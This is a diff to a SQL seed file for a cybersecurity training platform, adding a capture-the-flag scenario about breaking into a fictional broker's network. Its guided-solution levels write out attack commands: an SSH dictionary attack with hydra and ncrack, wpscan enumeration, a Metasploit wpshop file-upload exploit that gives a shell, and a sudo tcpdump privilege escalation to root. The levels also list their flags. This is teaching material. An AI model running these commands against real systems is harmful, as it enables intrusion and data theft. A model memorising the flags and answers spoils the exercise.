@@ -38,6 +38,15 @@ INSERT INTO abstract_level(id, max_score, next_level, title, post_hook_id, pre_h
 INSERT INTO abstract_level(id, max_score, next_level, title, post_hook_id, pre_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 23, 'Gaining the Document - Info', null, null);
 INSERT INTO abstract_level(id, max_score, next_level, title, post_hook_id, pre_hook_id) VALUES (nextval('abstract_level_id_seq'), 3, null, 'Gaining the Document', null, null);
 
+INSERT INTO abstract_level(id, max_score, next_level, title, post_hook_id, pre_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 25, 'Gaining Access - Info', null, null);
+INSERT INTO abstract_level(id, max_score, next_level, title, post_hook_id, pre_hook_id) VALUES (nextval('abstract_level_id_seq'), 20, 26, 'Gaining Access', null, null);
+INSERT INTO abstract_level(id, max_score, next_level, title, post_hook_id, pre_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 27, 'There Must be Some Vulnerability - Info', null, null);
+INSERT INTO abstract_level(id, max_score, next_level, title, post_hook_id, pre_hook_id) VALUES (nextval('abstract_level_id_seq'), 25, 28, 'There Must be Some Vulnerability', null, null);
+INSERT INTO abstract_level(id, max_score, next_level, title, post_hook_id, pre_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 29, 'Hack This Site - Info', null, null);
+INSERT INTO abstract_level(id, max_score, next_level, title, post_hook_id, pre_hook_id) VALUES (nextval('abstract_level_id_seq'), 25, 30, 'Hack This Site', null, null);
+INSERT INTO abstract_level(id, max_score, next_level, title, post_hook_id, pre_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 31, 'Make Me Root - Info', null, null);
+INSERT INTO abstract_level(id, max_score, next_level, title, post_hook_id, pre_hook_id) VALUES (nextval('abstract_level_id_seq'), 30, null, 'Make Me Root', null, null);
+
 
 INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (1, null, 25, 5, 'Play me', 'secretFlag', 'This is how you do it', true );
 INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (2, null, 60, 3, 'Unsolvable problem', 'jibberish', 'Not sure yet', false);
@@ -145,6 +154,101 @@ INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit
   <li>Click on home and then on msramek. You should see FranksPanamasStocks file.</li>
   <li>Click on "text" icon to open file as text. (It is next to icon that looks like Internet Explorer icon).</li>
 </ol>', '8342538', '8342538', true );
+INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (25, null, 15, 5, '<style type="text/css">
+  .prompt {color: #FF5555; font-weight: bold;}
+  .command {color:white;}
+</style>
+
+<p>
+  <b>Come on, you know how to do this!</b>
+</p>
+
+<ol style="margin-bottom: 2em">
+  <li>Scan the workstation and get open ports and publicly available services:</li>
+    <pre style="background-color:black; margin-top: 1em">
+<span class="prompt">root@attacker:~# </span><span class="command">nmap 172.18.1.132</span></pre>
+
+  <li>Start a dictionary attack on SSH using hydra or ncrack tool and get login credentials:</li>
+    <pre style="background-color:black; margin-top: 1em">
+<span class="prompt">root@attacker:~# </span><span class="command">hydra -V -L /root/usernames.txt -P /root/passwords.txt 172.18.1.132 ssh</span>
+<span class="prompt">root@attacker:~# </span><span class="command">ncrack -v -U /root/usernames.txt -P /root/passwords.txt 172.18.1.132:22</span></pre>
+</ol>', 'starwars', 'starwars', true );
+INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (27, null, 15, 5, '<style type="text/css">
+  .prompt {color: #FF5555; font-weight: bold;}
+  .command {color:white;}
+</style>
+
+<p>
+  <b>This is the funny part!</b>
+</p>
+
+<ol style="margin-bottom: 2em">
+  <li>Copy your Tools to the workstation:</li>
+    <pre style="background-color:black; margin-top: 1em">
+<span class="prompt">root@attacker:~# </span><span class="command">scp -r /root/Tools vondrus@172.18.1.132:/tmp/</span></pre>
+
+  <li>Unzip the wpscan archive:</li>
+    <pre style="background-color:black; margin-top: 1em">
+<span class="prompt">root@attacker:~# </span><span class="command">ssh -YC vondrus@172.18.1.132</span>
+<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">cd /tmp/Tools/</span>
+<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">unzip wpscan.zip</span></pre>
+
+  <li>Run vulnerability scanning:</li>
+    <pre style="background-color:black; margin-top: 1em"><span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">cd ./wpscan</span>
+<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">./wpscan --url http://bigbroker.ex --enumerate vp</span></pre>
+</ol>', '7830', '7830', true );
+INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (29, null, 15, 5, '<style type="text/css">
+  .prompt {color: #FF5555; font-weight: bold;}
+  .command {color:white;}
+</style>
+
+<p>
+  <b>Hacking is coming...</b>
+</p>
+
+<ol style="margin-bottom: 2em">
+  <li>Unzip the metasploit archive you copied to the workstation:</li>
+    <pre style="background-color:black; margin-top: 1em">
+<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">cd /tmp/Tools/</span>
+<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">unzip metasploit.zip</span>
+<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">cd ./metasploit</span></pre>
+
+  <li>Run the metasploit and start the exploit process:</li>
+    <pre style="background-color:black; margin-top: 1em">
+<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">./msfconsole</span>
+<span class="prompt" style="color: white;">&gt; </span><span class="command">use exploit/unix/webapp/wp_wpshop_ecommerce_file_upload</span>
+<span class="prompt" style="color: white;">&gt; </span><span class="command">set RHOST bigbroker.ex</span>
+<span class="prompt" style="color: white;">&gt; </span><span class="command">exploit</span></pre>
+
+  <li>Get the current username:</li>
+    <pre style="background-color:black; margin-top: 1em">
+<span class="prompt" style="color: white;">&gt; </span><span class="command">shell</span>
+<span class="command">whoami</span></pre>
+</ol>', 'www-data', 'www-data', true );
+INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (31, null, 15, 5, '<style type="text/css">
+  .prompt {color: #FF5555; font-weight: bold;}
+  .command {color:white;}
+</style>
+
+<p>
+  <b>This is true magic!</b> If you want to know more about ways of privilege escalation, see <a href="https://github.com/cermmik/security/blob/master/privilege_escalation_-_linux.md" target="_blank"><b>https://github.com/cermmik/security/blob/master/privilege_escalation_-_linux.md</b></a>.
+</p>
+
+<ol style="margin-bottom: 2em">
+  <li>The file with clients of Big Broker Inc. connected to the fraud is available at the "/home/bigbroker/" directory:
+    <pre style="background-color:black; margin-top: 1em">
+<span class="command">ls /home/bigbroker/</span></pre>
+
+  <li>The server is up to date so that no exploit can be used. But the administrator allows you to run "tcpdump" program with the sudo as you can see using the following command:
+<pre style="background-color:black; margin-top: 1em">
+<span class="command">sudo -l</span></pre>
+
+  <li>The program can be used to run a script. Therefore, you can perform command as a "root" as follows:
+    <pre style="background-color:black; margin-top: 1em">
+<span class="command">echo $'' id\ncat /home/bigbroker/pear-clients.xml'' > /tmp/.exploit</span>
+<span class="command">chmod +x /tmp/.exploit</span>
+<span class="command">sudo tcpdump -ln -i any -w /dev/null -W 1 -G 1 -z /tmp/.exploit -Z root</span></pre>
+</ol>', 'YouAreAHacker', 'YouAreAHacker', true );
 
 
 INSERT INTO info_level(id, content) VALUES (4, 'Informational stuff');
@@ -319,6 +423,98 @@ INSERT INTO info_level(id, content) VALUES (22, '<p>
   </ul>
 </p>');
 
+INSERT INTO info_level(id, content) VALUES (24, '<p>
+  You know that the <b>internal web server</b> of Big Broker Inc. with IP address <b>172.18.1.5 (bigbroker.ex)</b> contains information about clients linked to the fraud. However, this server is accessible only from the internal network where you have no access. But, the <b>workstation at 172.18.1.132</b> address seems accessible, and you know what it means! ;) <span style="color: #008000">Try to find out how to exploit security ignorance of your former colleagues and gain access to the internal network.</span>
+</p>
+
+<p>
+  If you are successful, you will be able to log in to the workstation. <b>The flag is the password you found.</b>
+</p>
+
+<img src="https://is.muni.cz/www/cermmik/kali.png" style="display: block; margin-left: auto; margin-right: auto; width: 40%;">
+
+<p style="margin-top: 2em">
+  <b>If you are stuck and need help, use the following hints:</b>
+  <ul>
+    <li><b>Hint 1:</b> What tool to use to detect open services on the workstation</li>
+    <li><b>Hint 2:</b> What tools to use to attack the open service</li>
+    <li><b>Hint 3:</b> Where are located files required by attacking tools</li>
+  </ul>
+</p>');
+INSERT INTO info_level(id, content) VALUES (26, '<style type="text/css">
+  .prompt {color: #FF5555; font-weight: bold;}
+  .command {color:white;}
+</style>
+
+<p>
+  Great, you <b>gained access to the workstation</b>, and now you can reach the web server. You know that there is an old web page with news for Big Broker''s employees. To see the web page, you can easily connect to the workstation and <b>run its web browser</b> using the following commands:
+  <ul>
+    <li>Connect to the workstation using SSH and obtained credentials – <b>user: <span style="color: #008000">vondrus<span></b>, <b>password: <span style="color: #008000">starwars</span></b>. (SSH options "-YC" allows you to see the graphical output.)
+      <pre style="background-color:black; margin-top: 1em">
+<span class="prompt">root@attacker:~# </span><span class="command">ssh -YC vondrus@172.18.1.132</span></pre>
+    <li>Now you can see the internal web page using the Firefox.</li>
+      <pre style="background-color:black; margin-top: 1em">
+<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">firefox</span></pre>
+  </ul>
+</p>
+
+<p>
+  The internal web page <b>looks exactly the way you remember it</b>, no change in appearance, and the content is similar. <span style="color: #008000">There must be some way of exploiting the page to obtain access!</span> The <b>Kali Linux</b> contains a lot of interesting <b>Tools</b>. Use them to find out what vulnerability to exploit. <b>The flag is the number of the vulnerability allowing you to upload an arbitrary file</b> (...db.com/vulnerabilities/<b>XXXX</b>).
+</p>
+
+<img src="https://is.muni.cz/www/cermmik/ctf-3-bigbroker-page.png" style="display: block; margin-left: auto; margin-right: auto; margin-top: 1em; width: 40%;">
+
+<p style="margin-top: 2em">
+  <b>If you are stuck and need help, use the following hints:</b>
+  <ul>
+    <li><b>Hint 1:</b> How to run your tools to reach the internal server</li>
+    <li><b>Hint 2:</b> Which tool use to find the vulnerability</li>
+  </ul>
+</p>');
+INSERT INTO info_level(id, content) VALUES (28, '<p>
+  Your assumption was confirmed, the <b>server is vulnerable</b> indeed! Now, you need to find a way how to exploit the <b>old version of the wpshop plugin</b> and obtain access to the server. That should not be a big deal for you. <span style="color: #008000">Your Kali Linux contains everything you need, just use it!</span>
+</p>
+
+<p>
+  If you are successful, you will be able to run commands on the server. <b>The flag is the username you will be logged in.</b>
+</p>
+
+<img src="https://is.muni.cz/www/cermmik/wpscan-result.png" style="display: block; margin-left: auto; margin-right: auto; margin-top: 1em; width: 40%;">
+
+<p style="margin-top: 2em">
+  <b>If you are stuck and need help, use the following hints:</b>
+  <ul>
+    <li><b>Hint 1:</b> What tool to use to exploit the vulnerability</li>
+    <li><b>Hint 2:</b> What tool plugin to use</li>
+  </ul>
+</p>');
+INSERT INTO info_level(id, content) VALUES (30, '<style type="text/css">
+  .prompt {color: #FF5555; font-weight: bold;}
+  .command {color:white;}
+</style>
+
+<p>
+  Great, you <b>gained access</b> to the server! As a former employee, you know that the system creates regular backups of Big Broker''s clients and store them in the <b>/home/bigbroker/</b> directory. The backup with Pear stocks clients is there (file <b>pear-clients.xml</b>), but when you tried the following command to read it, <b>a permissions error has occurred</b>:
+</p>
+
+<pre style="background-color:black;">
+  <span class="command">cat /home/bigbroker/pear-clients.xml</span></pre>
+
+<p>
+  You are so close and yet so far. :( You need to <b>escalate privileges</b> and get an administrator account! <span style="color: #008000">The server seems to be well updated, but maybe there is a way how to run commands as a server administrator.</span> When you get right permissions, you will be able to see the content of the pear-clients.xml file. <b>The flag is at the beginning of the file.</b>
+</p>
+
+<img src="https://is.muni.cz/www/cermmik/metasploit-result.png" style="display: block; margin-left: auto; margin-right: auto; margin-top: 2em; width: 40%;">
+
+<p style="margin-top: 2em">
+  <b>If you are stuck and need help, use the following hints:</b>
+  <ul>
+    <li><b>Hint 1:</b> What''s wrong with the server</li>
+    <li><b>Hint 2:</b> Where to find more information</li>
+    <li><b>Hint 3:</b> How to exploit the bad configuration</li>
+  </ul>
+</p>');
+
 INSERT INTO assessment_level(id, assessment_type, instructions, questions) VALUES (7, 'TEST', 'Fill me up', 'What is my mothers name?');
 INSERT INTO assessment_level(id, assessment_type, instructions, questions) VALUES (8, 'QUESTIONNAIRE', 'No rush', '...?');
 INSERT INTO assessment_level(id, assessment_type, instructions, questions) VALUES (9, 'TEST', 'Fill me up', '[{"question_type":"FFQ","text":"Write name of one malicious software?","points":6,"penalty":3,"order":0,"answer_required":true,"correct_choices":["viruses","trojans","worms","bots"]},{"question_type":"MCQ","text":"Among the following choices, select all the possible methods of prevention against an unwanted file upload.","points":4,"penalty":2,"order":1,"answer_required":true,"choices":[{"order":0,"text":"whitelisting file extensions","is_correct":true},{"order":1,"text":"limiting maximum file size","is_correct":true},{"order":2,"text":"using database triggers","is_correct":false},{"order":3,"text":"saving data to an NTFS volume","is_correct":false}]},{"question_type":"EMI","text":"Connect the following exemplary situations with the corresponding type of password attack.","points":3,"penalty":1,"order":2,"answer_required":true,"choices":[{"order":0,"text":"trying all possible alphanumeric combinations of 8 characters","pair":6},{"order":1,"text":"trying common words of English language","pair":4},{"order":2,"text":"looking up the value of a hashed password","pair":7},{"order":3,"text":"tricking a user into giving away his password by posing as a service administrator","pair":5},{"order":4,"text":"dictionary attack","pair":1},{"order":5,"text":"social engineering","pair":3},{"order":6,"text":"brute force attack","pair":0},{"order":7,"text":"rainbow table attack","pair":2}]}]');
@@ -339,6 +535,16 @@ INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextva
 INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Replace path of the file that is being deleted in delete form using "Developer tools".', 'Hint3', 2, 21);
 INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Martin Sramek', 'Hint1', 2, 23);
 
+INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Use <b style="color: #008000">nmap</b> tool to detect open services.', 'Hint1', 5, 25);
+INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'You can use <b style="color: #008000">hydra</b> or <b style="color: #008000">ncrack</b> tool.', 'Hint2', 10, 25);
+INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Come on, that was easy! Just look to your desktop directory <b style="color: #008000">/root/Desktop/Tools/</b>.', 'Hint3', 3, 25);
+INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Copy required <b>Tools</b> packages (<b>/root/Desktop/Tools/</b>) from the Kali linux to the workstation using <span style="color: #008000"><b>scp</b></span> command.', 'Hint1', 7, 27);
+INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'WordPress <b>plugins</b> vulnerability scanner <span style="color: #008000"><b>wpscan</b></span>. For more information, see the <a href="https://wpscan.org/" target="_blank"><b>project page</b></a>.', 'Hint2', 8, 27);
+INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), '<span style="color: #008000"><b>Metasploit</b></span>, this is a really classic tool.', 'Hint1', 8, 29);
+INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Use the <span style="color: #008000"><b>exploit/unix/webapp/wp_wpshop_ecommerce_file_upload</b></span> plugin.', 'Hint2', 10, 29);
+INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'The administrator allowed to run some of the installed tools using the sudo command. Use <span style="color: #008000"><b>sudo -l</b></span> to see these tools.', 'Hint1', 10, 31);
+INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Use <a href="https://google.com" target="_blank">Google</a>! There are definitely some interesting guides on the net.', 'Hint2', 5, 31);
+INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Check this guide with a lot of great ideas: <a href="https://github.com/cermmik/security/blob/master/privilege_escalation_-_linux.md" target="_blank">https://github.com/cermmik/security/blob/master/privilege_escalation_-_linux.md</a>.', 'Hint3', 13, 31);
 
 INSERT INTO training_definition(id, description, outcomes, prerequisities, state, title, sandbox_definition_ref_id, starting_level, show_stepper_bar) VALUES (nextval('training_definition_id_seq'), 'Released training definition', null, null, 'RELEASED', 'TrainingDefinition1', 1, 4, true);
 INSERT INTO training_definition(id, description, outcomes, prerequisities, state, title, sandbox_definition_ref_id, starting_level, show_stepper_bar) VALUES (nextval('training_definition_id_seq'), 'Unreleased training definition', null, null, 'UNRELEASED', 'TrainingDefinition2', 2, 5, false);
@@ -445,6 +651,59 @@ Rules
 <p style="margin-bottom: 4em;">
   <b> DO NOT USE SKIP LEVEL - HIGHER LEVELS CANNOT BE DONE WITHOUT COMPLETING PRECEDING LEVELS </b>
 </p>', null, null, 'RELEASED', 'CTF-2: Rigging the Election', null, 18, true);
+INSERT INTO training_definition(id, description, outcomes, prerequisities, state, title, sandbox_definition_ref_id, starting_level, show_stepper_bar) VALUES (nextval('training_definition_id_seq'), 'Introduction
+============
+<p style="margin-bottom: 2em">
+  You are <b>a former employee of Big Broker Inc.</b> one of the biggest stock trading companies. Recently, although you have been working for them for ten years, you have been fired without giving any reason. But you know the reason very well... It happened because you refused a request of your boss to falsify earnings reports of <b>Pear Inc.</b> stocks. A week ago, you read in the newspapers that <b>Pear Inc. achieved record gains</b>, and thanks to that, the shareholders got a lot of money. You know it''s a big scam, and you have evidence of the manipulation of earnings reports! But what you do not know is <b>who is behind it?</b>
+</p>
+
+<p>
+  As a former employee, you know that the <b>internal web server</b> of Big Broker Inc. contains <b>information about clients</b> linked to this fraud. However, this server is <b>available only from an internal network</b> that you no longer have access. You also know that your former colleagues do not care too much about the security of their devices. <span style="color: #008000">This issue may be the right way to access the network. But, are you able to exploit it?</span>
+</p>
+
+<img src="https://is.muni.cz/www/cermmik/newspapers.jpg" style="display: block; margin-left: auto; margin-right: auto; margin-top: 2em; width: 40%;">
+
+<p style="margin-top: 2em; margin-bottom: 3em;">
+  You have an access to the device with <b>Kali Linux</b> operating system. This is an <b>advanced penetration testing</b> Linux distribution used for ethical hacking and network security assessments with a lot of useful tools! <span style="color: #008000">Try to figure out how you can use these tools to hack Big Broker Inc. and get the list of clients.</span>
+</p>
+
+
+Rules
+=====
+<p>
+  <b>WARNING: You should never use these techniques and skills to gain unauthorized access. This is illegal. This game is only for educational purposes. To show you that absolute security does not exist and also how can you defend yourself.</b>
+</p>
+
+<p>
+  When you click on Topology button in the blue panel on the top, you should see the given network topology. When you double-click on the node called Internet, you should see one node: Attacker. Attacker represents the attacker''s computer; it contains all hacking tools you will need.
+</p>
+
+<p>
+  Now if you want to have an access to attacker computer click on attacker and select <b>Remote connection</b>. New tab appears with access to attacker''s computer. You can try any program you want. If you will need to <b>login</b>, the default credentials are <b>username: <span style="color: #008000">root</span></b>, <b>password: <span style="color: #008000">toor</span></b>.
+</p>
+
+<p>
+  The game consists of four levels. In each level, you will have to complete some specified task. To prove that you complete the task and can go to the next level you will have to submit a flag. Every level has a description of what to do and how to get the flag.
+</p>
+
+<p>
+  General note: <span style="color: #008000">All programs you will need to complete the tasks are installed, and also you don''t have access to the Internet.</span>
+</p>
+
+
+<h4 class="well well-small">Help System:</h4>
+
+<p>
+  If you are unable to complete a level, you can either use <b>hint</b> which will give a little help, but you will lose some points. After using all the hints if you still don''t know how to complete the task use <b>help level</b>. It''s a guided solution which will tell you exactly what to do. The last option is to skip level entirely by clicking on the skip level, but this is not recommended – you won''t be able to complete following levels without doing what is in your current one. It is better to ask someone for help
+</p>
+
+<p>
+  Each level has a passphrase, so you can go to any level you know passphrase for, but you won''t get any points for any previous levels. So the good advice is to write down the passphrases as you go through levels.
+</p>
+
+<p style="margin-bottom: 4em;">
+  <b> DO NOT USE SKIP LEVEL – HIGHER LEVELS CANNOT BE DONE WITHOUT COMPLETING PRECEDING LEVELS. </b>
+</p>', null, null, 'RELEASED', 'CTF-3: The Biggest Stock Scam Of All Time', null, 24, true);
 
 INSERT INTO training_instance(id, pool_size, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 5, 1, '2016-10-19 10:23:54+02', '2017-10-19 10:23:54+02', 'pass-1235', 'Concluded Instance');
 INSERT INTO training_instance(id, pool_size, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 8, 1, '2016-10-19 10:23:54+02', '2022-10-19 10:23:54+02', 'hello-6578', 'Current Instance');
